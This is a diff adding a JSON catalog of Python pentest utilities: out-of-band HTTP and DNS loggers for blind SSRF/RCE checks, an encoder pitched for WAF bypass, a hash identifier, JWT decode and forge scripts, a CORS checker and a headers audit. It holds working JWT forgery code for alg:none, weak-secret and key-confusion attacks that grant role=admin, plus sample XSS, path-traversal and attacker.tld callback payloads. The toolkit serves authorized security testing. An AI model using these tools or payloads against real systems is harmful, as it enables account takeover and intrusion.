@@ -1,0 +1,147 @@
+{
+  "category": "Utilities",
+  "group": "utility",
+  "catOrder": 50,
+  "entries": [
+    {
+      "title": "OOB HTTP logger (offline, stdlib)",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "oob",
+        "blind",
+        "ssrf",
+        "listener"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.7+)",
+      "placeholders": "{{PORT}} · {{LOG_FILE}} · per-sink token in path",
+      "badges": [
+        "oob"
+      ],
+      "source": "https://portswigger.net/burp/documentation/collaborator",
+      "license": "GPL-3.0 (original)",
+      "body": "A simple **OOB HTTP logger** in pure stdlib: it spins up an HTTP server that logs ANY incoming request in full (method, path, headers, body, source IP) and answers `200 ok`. Needed to confirm blind vulnerabilities (blind SSRF, blind XXE, RCE with `curl`/`wget`, webhook injections), when the application does not show the result but can reach out to your URL. A local offline replacement for Burp Collaborator/interactsh inside an isolated lab.\n\n> For a pure HTTP check you do not need root (listen on a port >1024, for example 8000). By default it writes hits both to the console and to a log file. The request path can be used as a token to tie a hit to a specific injection point.\n\n```python\n#!/usr/bin/env python3\n# oob_http.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Minimal out-of-band HTTP logger for blind SSRF/XXE/RCE confirmation.\nimport argparse, datetime\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\n\nLOGF = None\n\ndef stamp():\n    return datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\ndef record(text):\n    print(text)\n    if LOGF:\n        with open(LOGF, \"a\", encoding=\"utf-8\") as f:\n            f.write(text + \"\\n\")\n\nclass H(BaseHTTPRequestHandler):\n    def _dump(self):\n        length = int(self.headers.get(\"Content-Length\", 0) or 0)\n        body = self.rfile.read(length) if length else b\"\"\n        hdrs = \"\".join(f\"      {k}: {v}\\n\" for k, v in self.headers.items())\n        record(\n            f\"[+] {stamp()}  HIT from {self.client_address[0]}\\n\"\n            f\"    {self.command} {self.path}\\n{hdrs}\"\n            + (f\"    body: {body[:2048]!r}\\n\" if body else \"\")\n        )\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"text/plain\")\n        self.end_headers()\n        self.wfile.write(b\"ok\\n\")\n    do_GET = do_POST = do_PUT = do_HEAD = do_OPTIONS = _dump\n    def log_message(self, *a):  # silence default noise\n        pass\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL offline OOB HTTP logger\")\n    ap.add_argument(\"--host\", default=\"0.0.0.0\")\n    ap.add_argument(\"-p\", \"--port\", type=int, default=8000)\n    ap.add_argument(\"-l\", \"--log\", default=\"oob_http.log\")\n    a = ap.parse_args()\n    global LOGF\n    LOGF = a.log\n    srv = ThreadingHTTPServer((a.host, a.port), H)\n    record(f\"[*] OOB HTTP logger on {a.host}:{a.port}  (log -> {a.log})\")\n    record(f\"[*] payload URL example: http://YOUR-IP:{a.port}/<unique-token>\")\n    try:\n        srv.serve_forever()\n    except KeyboardInterrupt:\n        record(\"[=] stopped\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 oob_http.py -p 8000\n# put http://YOUR-IP:8000/sink1 into the vulnerable parameter\n```"
+    },
+    {
+      "title": "OOB DNS logger (UDP, RFC1035)",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "oob",
+        "blind",
+        "dns",
+        "listener"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{PORT}} (53) · {{LOG_FILE}}",
+      "badges": [
+        "oob",
+        "root"
+      ],
+      "source": "https://datatracker.ietf.org/doc/html/rfc1035",
+      "license": "GPL-3.0 (original)",
+      "body": "An **OOB DNS logger**: a UDP server that manually parses DNS queries (RFC 1035) and logs the queried name + the resolver's IP, answering with a fixed A record `127.0.0.1`. The DNS channel catches even the most \"deaf\" injections: the target often cannot make outbound HTTP, but almost always resolves names. If you delegate a zone to your own server (`ns.attacker.tld`) and slip in the payload `token.attacker.tld`, the log shows the fact that it fired and the token. Supports A (RFC 1035) and AAAA (type 28, RFC 3596).\n\n> Listens on port **53**, so it needs **root** (`sudo`). The response must have `ANCOUNT=1`, otherwise some resolvers consider the answer empty. `recvfrom(4096)` - with headroom for EDNS. This is not a full DNS server: it answers everything the same way, its job is only to log.\n\n```python\n#!/usr/bin/env python3\n# oob_dns.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Out-of-band DNS logger (RFC1035 parse), answers A 127.0.0.1 / AAAA ::1.\nimport argparse, datetime, socket, struct\n\ndef stamp():\n    return datetime.datetime.now().strftime(\"%H:%M:%S\")\n\ndef parse_qname(data, off=12):\n    labels = []\n    i = off\n    while i < len(data) and data[i] != 0:\n        ln = data[i]\n        labels.append(data[i + 1:i + 1 + ln].decode(\"latin1\"))\n        i += ln + 1\n    return \".\".join(labels), i + 1  # i+1 -> position after the zero byte\n\ndef build_answer(data, qend):\n    tid = data[:2]\n    # question section bytes (qname + qtype + qclass)\n    question = data[12:qend + 4]\n    qtype = struct.unpack(\">H\", data[qend:qend + 2])[0]\n    flags = b\"\\x81\\x80\"          # response, recursion available, no error\n    counts = struct.pack(\">HHHH\", 1, 1, 0, 0)  # QD=1, AN=1 (mandatory), NS=0, AR=0\n    # pointer to the name in the question (0xc00c), then type/class/ttl/rdata\n    if qtype == 28:              # AAAA, RFC3596\n        rr = b\"\\xc0\\x0c\" + struct.pack(\">HHIH\", 28, 1, 60, 16) + socket.inet_pton(socket.AF_INET6, \"::1\")\n    else:                        # A, RFC1035 (default for everything else)\n        rr = b\"\\xc0\\x0c\" + struct.pack(\">HHIH\", 1, 1, 60, 4) + socket.inet_aton(\"127.0.0.1\")\n    return tid + flags + counts + question + rr\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL offline OOB DNS logger\")\n    ap.add_argument(\"--host\", default=\"0.0.0.0\")\n    ap.add_argument(\"-p\", \"--port\", type=int, default=53)\n    ap.add_argument(\"-l\", \"--log\", default=\"oob_dns.log\")\n    a = ap.parse_args()\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.bind((a.host, a.port))\n    print(f\"[*] OOB DNS logger on {a.host}:{a.port}  (needs root for :53, log -> {a.log})\")\n    while True:\n        data, addr = s.recvfrom(4096)\n        try:\n            qname, qend = parse_qname(data)\n            qtype = struct.unpack(\">H\", data[qend:qend + 2])[0]\n            line = f\"[+] {stamp()}  {addr[0]}  query {qname}  (type {qtype})\"\n            print(line)\n            with open(a.log, \"a\", encoding=\"utf-8\") as f:\n                f.write(line + \"\\n\")\n            s.sendto(build_answer(data, qend), addr)\n        except Exception as e:\n            print(f\"[!] malformed packet from {addr[0]}: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\n# needs root for port 53\nsudo python3 oob_dns.py -p 53\n# delegate the zone to your IP and use the payload token.attacker.tld\n```"
+    },
+    {
+      "title": "Encoder/decoder multi-tool",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "encoding",
+        "base64",
+        "url",
+        "waf-bypass"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{SCHEME}} · {{DATA}}",
+      "source": "https://gchq.github.io/CyberChef/",
+      "license": "GPL-3.0 (original)",
+      "body": "A Swiss-army knife for **encoding/decoding** in web pentesting: base64, URL, double-URL, HTML-entity, unicode (`\\uXXXX`), charcode (`String.fromCharCode`), hex - both ways (encode/decode). Useful every day: bypassing filters, parsing a payload from traffic, assembling XSS/SQLi in the required wrapper, decoding a token. Reads from an argument or stdin (pipe), which is handy when chained with other tools.\n\n> Fully offline, stdlib. For double URL-encoding use `double-url` (a common WAF bypass). `unicode`/`charcode` are handy for the JS context of XSS. There is no \"guess\" decoding here - specify the scheme explicitly.\n\n```python\n#!/usr/bin/env python3\n# enctool.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Multi-scheme encoder/decoder: base64,url,double-url,html,unicode,charcode,hex.\nimport argparse, base64, html, sys, urllib.parse\n\ndef enc(scheme, s):\n    b = s.encode(\"utf-8\", \"surrogatepass\")\n    if scheme == \"base64\":   return base64.b64encode(b).decode()\n    if scheme == \"url\":      return urllib.parse.quote(s, safe=\"\")\n    if scheme == \"double-url\": return urllib.parse.quote(urllib.parse.quote(s, safe=\"\"), safe=\"\")\n    if scheme == \"html\":     return html.escape(s).replace(\"'\", \"&#x27;\")\n    if scheme == \"unicode\":  return \"\".join(f\"\\\\u{ord(c):04x}\" for c in s)\n    if scheme == \"charcode\": return \",\".join(str(ord(c)) for c in s)\n    if scheme == \"hex\":      return b.hex()\n    raise ValueError(scheme)\n\ndef dec(scheme, s):\n    if scheme == \"base64\":   return base64.b64decode(s + \"=\" * (-len(s) % 4)).decode(\"utf-8\", \"replace\")\n    if scheme == \"url\":      return urllib.parse.unquote(s)\n    if scheme == \"double-url\": return urllib.parse.unquote(urllib.parse.unquote(s))\n    if scheme == \"html\":     return html.unescape(s)\n    if scheme == \"unicode\":  return s.encode().decode(\"unicode_escape\")\n    if scheme == \"charcode\": return \"\".join(chr(int(x)) for x in s.replace(\" \", \"\").split(\",\") if x)\n    if scheme == \"hex\":      return bytes.fromhex(s.replace(\" \", \"\").replace(\"0x\", \"\")).decode(\"utf-8\", \"replace\")\n    raise ValueError(scheme)\n\nSCHEMES = [\"base64\", \"url\", \"double-url\", \"html\", \"unicode\", \"charcode\", \"hex\"]\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL encoder/decoder\")\n    ap.add_argument(\"scheme\", choices=SCHEMES)\n    ap.add_argument(\"-d\", \"--decode\", action=\"store_true\", help=\"decode instead of encode\")\n    ap.add_argument(\"data\", nargs=\"?\", help=\"input (or read from stdin if omitted)\")\n    a = ap.parse_args()\n    data = a.data if a.data is not None else sys.stdin.read().rstrip(\"\\n\")\n    out = dec(a.scheme, data) if a.decode else enc(a.scheme, data)\n    sys.stdout.write(out + \"\\n\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 enctool.py base64 \"<script>alert(1)</script>\"\npython3 enctool.py double-url \"../../etc/passwd\"\necho \"PHNjcmlwdD4=\" | python3 enctool.py base64 -d\npython3 enctool.py unicode \"<img src=x>\"\n```"
+    },
+    {
+      "title": "Hash identifier + hashcat mode",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "hash",
+        "hashcat",
+        "cracking"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{HASH}}",
+      "source": "https://hashcat.net/wiki/doku.php?id=example_hashes",
+      "license": "GPL-3.0 (original)",
+      "body": "Identifies a **hash type** by length and form (regex), and immediately prints the matching **hashcat `-m` mode**. Covers MD5, SHA1/256/512, NTLM, bcrypt, MySQL, NetNTLMv2, Kerberos and more. Important subtleties from verification: `-m 300` is stored-MySQL `SHA1(SHA1(pass))` (double SHA1), while the network MySQL-CRAM handshake is `-m 11200`; MD5 and NTLM are both \"32 hex\" and indistinguishable by form - both options are printed with a note. Saves time: no need to dig into the hashcat wiki every time.\n\n> Distinguishing by length is heuristic. Bare `32hex` -> both MD5 (`-m 0`) and NTLM (`-m 1000`): context decides (NTLM usually comes from a SAM/secretsdump dump). bcrypt/argon/sha-crypt are recognized by their prefix (`$2b$`, `$argon2`, `$6$`).\n\n```python\n#!/usr/bin/env python3\n# hashid.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Identify a hash type + print the matching hashcat -m mode.\nimport re, sys\n\n# (regex, [(label, hashcat_mode), ...])\nRULES = [\n    (r\"^[a-f0-9]{32}$\",        [(\"MD5\", 0), (\"NTLM\", 1000), (\"MD4\", 900), (\"LM (half)\", 3000)]),\n    (r\"^[a-f0-9]{40}$\",        [(\"SHA1\", 100), (\"MySQL4.1+ SHA1(SHA1) stored\", 300)]),\n    (r\"^[a-f0-9]{56}$\",        [(\"SHA-224\", 1300)]),\n    (r\"^[a-f0-9]{64}$\",        [(\"SHA-256\", 1400), (\"SHA3-256\", 17400)]),\n    (r\"^[a-f0-9]{96}$\",        [(\"SHA-384\", 10800)]),\n    (r\"^[a-f0-9]{128}$\",       [(\"SHA-512\", 1700), (\"Whirlpool\", 6100)]),\n    (r\"^\\*[A-F0-9]{40}$\",      [(\"MySQL4.1+ (network *HEX)\", 300)]),\n    (r\"^[a-f0-9]{16}$\",        [(\"MySQL323 (old)\", 200)]),\n    (r\"^\\$1\\$[./A-Za-z0-9]{1,8}\\$[./A-Za-z0-9]{22}$\", [(\"md5crypt\", 500)]),\n    (r\"^\\$2[abxy]\\$\\d{2}\\$[./A-Za-z0-9]{53}$\",        [(\"bcrypt\", 3200)]),\n    (r\"^\\$5\\$\",                [(\"sha256crypt\", 7400)]),\n    (r\"^\\$6\\$\",                [(\"sha512crypt\", 1800)]),\n    (r\"^\\$argon2(id|i|d)\\$\",   [(\"Argon2\", -1)]),\n    (r\"^[a-f0-9]{32}:[a-f0-9]{32}$\", [(\"NetNTLMv1-ish / md5:salt\", 10)]),\n    (r\"^\\$krb5tgs\\$23\\$\",      [(\"Kerberos 5 TGS-REP RC4 (kerberoast)\", 13100)]),\n    (r\"^\\$krb5asrep\\$23\\$\",    [(\"Kerberos 5 AS-REP RC4 (asreproast)\", 18200)]),\n    (r\"^[^:]+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:\", [(\"NetNTLMv2\", 5600)]),\n    # network MySQL CRAM handshake challenge:response\n    (r\"^[a-f0-9]{40}:[a-f0-9]{40}$\", [(\"MySQL CRAM (network challenge:response)\", 11200)]),\n]\n\ndef identify(h):\n    h = h.strip()\n    out = []\n    for rx, modes in RULES:\n        if re.match(rx, h, re.IGNORECASE):\n            out.extend(modes)\n    return out\n\ndef main():\n    args = sys.argv[1:]\n    hashes = args if args else [l.strip() for l in sys.stdin if l.strip()]\n    for h in hashes:\n        matches = identify(h)\n        print(f\"[*] {h}\")\n        if not matches:\n            print(\"    [?] unknown / unsupported format\")\n            continue\n        for label, mode in matches:\n            m = f\"hashcat -m {mode}\" if mode >= 0 else \"argon2 (use john/argon2 cli)\"\n            print(f\"    -> {label:42}  {m}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 hashid.py 5f4dcc3b5aa765d61d8327deb882cf99\npython3 hashid.py '$2b$12$....'\ncat hashes.txt | python3 hashid.py\n```"
+    },
+    {
+      "title": "JWT decoder (no verify)",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "jwt",
+        "auth",
+        "token"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{JWT}}",
+      "source": "https://datatracker.ietf.org/doc/html/rfc7519",
+      "license": "GPL-3.0 (original)",
+      "body": "Decodes a **JWT** without verifying the signature: it splits into header/payload/signature, base64url-decodes (topping up the padding that JWT lacks) and pretty-prints the JSON. It highlights the important claims: `alg`, `kid`, `exp`/`iat`/`nbf` (converted to a date and flagged as \"expired\"). The first step in analyzing any token: understand the algorithm, claims and lifetime before attempting forgery.\n\n> JWT uses **base64url WITHOUT padding** - so we pad the `=` manually. The signature is not verified (there is nothing to verify it with, without the key). `alg:none` or `alg:HS256` with a public RSA key available -> see `jwt_forge.py`.\n\n```python\n#!/usr/bin/env python3\n# jwt_decode.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Decode a JWT (no signature verification) and highlight key claims.\nimport base64, datetime, json, sys\n\ndef b64url_decode(seg):\n    seg += \"=\" * (-len(seg) % 4)            # JWT base64url has no padding\n    return base64.urlsafe_b64decode(seg)\n\ndef show(name, seg):\n    try:\n        obj = json.loads(b64url_decode(seg))\n    except Exception as e:\n        print(f\"[!] {name}: cannot decode ({e})\"); return {}\n    print(f\"== {name} ==\")\n    print(json.dumps(obj, indent=2, ensure_ascii=False))\n    return obj\n\ndef ts(label, v):\n    try:\n        d = datetime.datetime.utcfromtimestamp(int(v))\n        flag = \"  <-- EXPIRED\" if label == \"exp\" and d < datetime.datetime.utcnow() else \"\"\n        print(f\"    {label} = {v}  ({d} UTC){flag}\")\n    except Exception:\n        pass\n\ndef main():\n    if len(sys.argv) < 2:\n        token = sys.stdin.read().strip()\n    else:\n        token = sys.argv[1].strip()\n    parts = token.split(\".\")\n    if len(parts) < 2:\n        sys.exit(\"[!] not a JWT (need at least header.payload)\")\n    hdr = show(\"HEADER\", parts[0])\n    pl = show(\"PAYLOAD\", parts[1])\n    print(\"== NOTES ==\")\n    print(f\"    alg = {hdr.get('alg')!r}   kid = {hdr.get('kid')!r}\")\n    for c in (\"iat\", \"nbf\", \"exp\"):\n        if c in pl:\n            ts(c, pl[c])\n    sig = parts[2] if len(parts) > 2 else \"\"\n    print(f\"    signature present: {bool(sig)} ({len(sig)} chars, NOT verified)\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 jwt_decode.py \"eyJhbGciOi...<token>\"\necho \"eyJ...<token>\" | python3 jwt_decode.py\n```"
+    },
+    {
+      "title": "JWT forger (none / HS256 / kid / RS256->HS256)",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "jwt",
+        "auth",
+        "exploit",
+        "token"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{JWT}} · {{CLAIMS k=v}} · {{SECRET}} · {{PUBKEY_PEM}}",
+      "source": "https://portswigger.net/web-security/jwt",
+      "license": "GPL-3.0 (original)",
+      "body": "Forges a **JWT** for classic vulnerabilities: (1) `alg:none` - drops the signature if the server does not verify it; (2) HS256 re-sign - reassembles the token with your payload and signs it with a known/weak secret; (3) `kid` injection - swaps `kid` for a path/SQL payload; (4) **alg confusion RS256 -> HS256** - signs with HS256 using the server's PUBLIC RSA key as the HMAC secret (if the server mistakenly verifies HS256 with the public key). You change the claims (`role: admin`, `sub`) and get a ready-made token.\n\n> alg confusion needs the server's public key (`.pem`, often from `/jwks.json` or the TLS certificate). HS256 re-sign requires guessing/knowing the secret (brute-force it with a separate tool). Try `alg:none` first - it is free in terms of effort.\n\n```python\n#!/usr/bin/env python3\n# jwt_forge.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Forge JWTs: alg:none / HS256 re-sign / kid inject / RS256->HS256 confusion.\nimport argparse, base64, hashlib, hmac, json, sys\n\ndef b64u(b):\n    return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\ndef b64u_json(obj):\n    return b64u(json.dumps(obj, separators=(\",\", \":\")).encode())\n\ndef decode_part(seg):\n    seg += \"=\" * (-len(seg) % 4)\n    return json.loads(base64.urlsafe_b64decode(seg))\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL JWT forger\")\n    ap.add_argument(\"token\", help=\"original JWT to tamper\")\n    ap.add_argument(\"--set\", action=\"append\", default=[], metavar=\"k=v\",\n                    help=\"set/override a payload claim (value parsed as JSON if possible)\")\n    ap.add_argument(\"--mode\", choices=[\"none\", \"hs256\", \"kid\", \"confusion\"], default=\"none\")\n    ap.add_argument(\"--secret\", default=\"secret\", help=\"HMAC secret for hs256 mode\")\n    ap.add_argument(\"--kid\", help=\"value to inject into header kid\")\n    ap.add_argument(\"--pubkey\", help=\"server RSA public key PEM (for confusion mode)\")\n    a = ap.parse_args()\n\n    h, p = a.token.split(\".\")[0], a.token.split(\".\")[1]\n    header, payload = decode_part(h), decode_part(p)\n    for kv in a.set:\n        k, _, v = kv.partition(\"=\")\n        try:    payload[k] = json.loads(v)\n        except Exception: payload[k] = v\n    if a.kid:\n        header[\"kid\"] = a.kid\n\n    if a.mode == \"none\":\n        header[\"alg\"] = \"none\"\n        print(f\"{b64u_json(header)}.{b64u_json(payload)}.\")\n        return\n\n    header[\"alg\"] = \"HS256\"\n    signing_in = f\"{b64u_json(header)}.{b64u_json(payload)}\".encode()\n\n    if a.mode == \"confusion\":\n        if not a.pubkey:\n            sys.exit(\"[!] confusion mode needs --pubkey server_public.pem\")\n        key = open(a.pubkey, \"rb\").read()   # use the RSA *public* key bytes as HMAC secret\n    else:  # hs256 / kid both HMAC-sign with --secret\n        key = a.secret.encode()\n\n    sig = hmac.new(key, signing_in, hashlib.sha256).digest()\n    print(f\"{signing_in.decode()}.{b64u(sig)}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\n# alg:none\npython3 jwt_forge.py \"<token>\" --set role=admin --mode none\n# HS256 re-sign with a weak secret\npython3 jwt_forge.py \"<token>\" --set role=admin --mode hs256 --secret 'secret'\n# RS256 -> HS256 alg confusion (needs the server's public key)\npython3 jwt_forge.py \"<token>\" --set role=admin --mode confusion --pubkey server_pub.pem\n# kid injection\npython3 jwt_forge.py \"<token>\" --mode kid --kid \"../../dev/null\" --secret \"\"\n```"
+    },
+    {
+      "title": "CORS misconfiguration checker",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "cors",
+        "misconfig",
+        "web"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{URL}}",
+      "source": "https://portswigger.net/web-security/cors",
+      "license": "GPL-3.0 (original)",
+      "body": "Checks for **CORS misconfig**: it sends a request with a forged `Origin: https://evil.example` and looks at the response headers `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC). It classifies the findings: **HIGH** - the server reflects any Origin (`ACAO == your evil`) AND returns `ACAC: true` (you can steal the victim's authenticated data); MEDIUM - `null`-origin reflection or trust of an arbitrary subdomain; INFO - wildcard `*` without credentials. It tests several payload origins (reflected, null, subdomain-suffix, pre-domain).\n\n> The most dangerous case is exactly **reflected-origin + credentials=true**: that is full-on data theft. The browser forbids `ACAO: *` with `credentials`, so a lone `*` without credentials is usually only INFO. The script does not send real cookies, it only reads the policy.\n\n```python\n#!/usr/bin/env python3\n# cors_check.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Detect permissive CORS: reflected origin + credentials = HIGH.\nimport argparse, ssl, sys, urllib.request\n\ndef probe(url, origin, timeout):\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n    req = urllib.request.Request(url, headers={\n        \"Origin\": origin, \"User-Agent\": \"ARS3NAL-cors/1.0\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:\n            h = r.headers\n            return h.get(\"Access-Control-Allow-Origin\"), h.get(\"Access-Control-Allow-Credentials\")\n    except urllib.error.HTTPError as e:\n        return e.headers.get(\"Access-Control-Allow-Origin\"), e.headers.get(\"Access-Control-Allow-Credentials\")\n    except Exception as e:\n        return None, f\"err:{e}\"\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL CORS misconfig checker\")\n    ap.add_argument(\"url\")\n    ap.add_argument(\"-t\", \"--timeout\", type=int, default=15)\n    a = ap.parse_args()\n    host = a.url.split(\"//\", 1)[-1].split(\"/\", 1)[0]\n    tests = {\n        \"reflected\":  \"https://evil-ars3nal.example\",\n        \"null\":       \"null\",\n        \"subdomain\":  f\"https://evil-ars3nal.{host}\",\n        \"suffix\":     f\"https://{host}.evil-ars3nal.example\",\n        \"prefix\":     f\"https://evil-ars3nal-{host}\",\n    }\n    worst = \"none\"\n    for name, origin in tests.items():\n        acao, acac = probe(a.url, origin, a.timeout)\n        creds = str(acac).lower() == \"true\"\n        sev = \"INFO\"\n        if acao == origin and creds:\n            sev = \"HIGH\"\n        elif acao == origin or acao == \"null\":\n            sev = \"MEDIUM\"\n        elif acao == \"*\":\n            sev = \"INFO\"\n        else:\n            sev = \"ok\"\n        if sev in (\"HIGH\", \"MEDIUM\") and worst != \"HIGH\":\n            worst = sev\n        print(f\"  [{sev:6}] Origin={origin:42}  ACAO={acao!r}  creds={acac!r}\")\n    print(f\"[=] worst finding: {worst}\")\n    sys.exit(0)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 cors_check.py https://api.target.example.com/account\n```"
+    },
+    {
+      "title": "Security headers audit",
+      "lang": "python",
+      "tags": [
+        "utility",
+        "headers",
+        "csp",
+        "hsts",
+        "web"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{URL}}",
+      "source": "https://owasp.org/www-project-secure-headers/",
+      "license": "GPL-3.0 (original)",
+      "body": "Audits the response's **security headers**: it checks the presence and quality of `Content-Security-Policy`, `Strict-Transport-Security` (HSTS), `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, and also highlights informational leaks `Server`/`X-Powered-By`. An important takeaway from verification: `X-XSS-Protection` is **deprecated** - its absence is NOT flagged as a problem; on the contrary, `X-XSS-Protection: 0` and reliance on CSP are recommended. A quick baseline hygiene check for a report.\n\n> HSTS only makes sense on HTTPS; on plain HTTP its absence is not a bug. CSP is evaluated roughly (present/absent + presence of `unsafe-inline`/`*`). Version leaks in `Server`/`X-Powered-By` are INFO, not a vulnerability in themselves.\n\n```python\n#!/usr/bin/env python3\n# secheaders_check.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Audit security response headers (X-XSS-Protection is deprecated, not flagged).\nimport argparse, ssl, urllib.request\n\ndef fetch_headers(url, timeout):\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\n    req = urllib.request.Request(url, headers={\"User-Agent\": \"ARS3NAL-sec/1.0\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:\n            return dict((k.lower(), v) for k, v in r.headers.items()), r.url\n    except urllib.error.HTTPError as e:\n        return dict((k.lower(), v) for k, v in e.headers.items()), url\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL security headers audit\")\n    ap.add_argument(\"url\")\n    ap.add_argument(\"-t\", \"--timeout\", type=int, default=15)\n    a = ap.parse_args()\n    h, final = fetch_headers(a.url, a.timeout)\n    https = final.startswith(\"https\")\n    print(f\"[*] {final}\")\n\n    def ok(name, val):  print(f\"  [ ok ] {name}: {val}\")\n    def miss(name, why): print(f\"  [MISS] {name}  -> {why}\")\n\n    csp = h.get(\"content-security-policy\")\n    if csp:\n        weak = \"unsafe-inline\" in csp or \" *\" in csp\n        ok(\"CSP\", csp[:80] + (\" ... [weak: unsafe-inline/*]\" if weak else \"\"))\n    else:\n        miss(\"Content-Security-Policy\", \"no CSP -> XSS mitigation absent\")\n\n    hsts = h.get(\"strict-transport-security\")\n    if hsts: ok(\"HSTS\", hsts)\n    elif https: miss(\"Strict-Transport-Security\", \"HTTPS without HSTS\")\n    else: print(\"  [info] HSTS n/a on plain HTTP\")\n\n    for name, key, why in [\n        (\"X-Frame-Options\", \"x-frame-options\", \"clickjacking (or use CSP frame-ancestors)\"),\n        (\"X-Content-Type-Options\", \"x-content-type-options\", \"MIME sniffing (want: nosniff)\"),\n        (\"Referrer-Policy\", \"referrer-policy\", \"referrer leakage\"),\n        (\"Permissions-Policy\", \"permissions-policy\", \"feature policy not set\"),\n    ]:\n        v = h.get(key)\n        ok(name, v) if v else miss(name, why)\n\n    # X-XSS-Protection is DEPRECATED: do NOT flag absence; warn only if enabled to 1\n    xxp = h.get(\"x-xss-protection\")\n    if xxp and xxp.strip().startswith(\"1\"):\n        print(f\"  [warn] X-XSS-Protection: {xxp} -> deprecated, set to 0 and rely on CSP\")\n\n    for leak in (\"server\", \"x-powered-by\", \"x-aspnet-version\"):\n        if h.get(leak):\n            print(f\"  [info] version leak {leak}: {h[leak]}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 secheaders_check.py https://target.example.com\n```"
+    }
+  ]
+}
